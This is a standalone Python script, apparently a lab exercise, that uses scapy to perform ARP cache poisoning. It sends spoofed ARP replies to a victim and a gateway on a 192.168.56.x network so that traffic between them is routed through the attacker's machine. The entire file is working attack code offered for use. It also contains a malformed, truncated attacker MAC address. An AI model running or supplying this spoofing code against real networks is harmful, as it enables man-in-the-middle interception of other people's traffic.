from scapy.all import Ether, ARP, sendp
import netifaces

def sendPoisonPacket(ipAttacker, macAttacker, ipTarget, macTarget, ipToSpoof, iface):
    # Build ARP Packet
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macTarget
    arp[ARP].pdst = ipTarget

    # Send ARP Packet
    sendp(arp, iface=iface)

# Attacker machine
ipAttacker = "192.168.56.103"  # Modify this with the attacker machine IP address
macAttacker = "08:00:27:d0:4b"  # Modify this with the attacker machine MAC address

# Victim machine
ipVictim = "192.168.56.101"  # Modify this with the victim machine IP address
macVictim = "08:00:27:b7:c4:af"  # Modify this with the victim machine MAC address

# Gateway machine
ipGateway = "192.168.56.1"  # Modify this with the gateway machine IP address
macGateway = "08:00:27:94:63:8c"  # Modify this with the gateway machine MAC address

# Find the interface name
interfaces = netifaces.interfaces()
iface = interfaces[0]  # Assumes the first interface is the correct one, you can modify this based on your setup

# Send ARP packets to poison victim's and gateway's ARP tables
sendPoisonPacket(ipAttacker, macAttacker, ipVictim, macVictim, ipGateway, iface)
sendPoisonPacket(ipAttacker, macAttacker, ipGateway, macGateway, ipVictim, iface)

print("ARP Poisoning initialized...")
try:
    # Keep the program running
    while True:
        pass
except KeyboardInterrupt:
    print("ARP Poisoning stopped")
